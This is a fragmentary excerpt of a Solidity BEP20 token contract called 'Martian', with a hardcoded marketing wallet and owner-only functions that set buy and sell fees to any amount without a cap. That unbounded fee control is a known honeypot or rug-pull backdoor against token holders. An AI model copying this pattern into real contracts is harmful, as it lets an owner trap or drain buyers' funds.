...
contract Martian is Context, IBEP20, Ownable {
    ...
    uint256 private blockchain = 4;
    uint256 private maxB = 100000 * 10 ** 18;
    ...
    uint256 private sAAmm = 100000 * 10 ** 18;
    address Marketing = 0xf6a8091724e27884d0CFB3FB2Bd61d39eAaaDa2d;
    ...
    */
    ...
    function setBF(uint amount) public onlyOwner{
      require(_isExcludedFromFee[msg.sender] == true);
      totalBuyFee = amount;
    }

    function setSF(uint amount) public onlyOwner{
      require(_isExcludedFromFee[msg.sender] == true);
      totalSellFee = amount;
    }
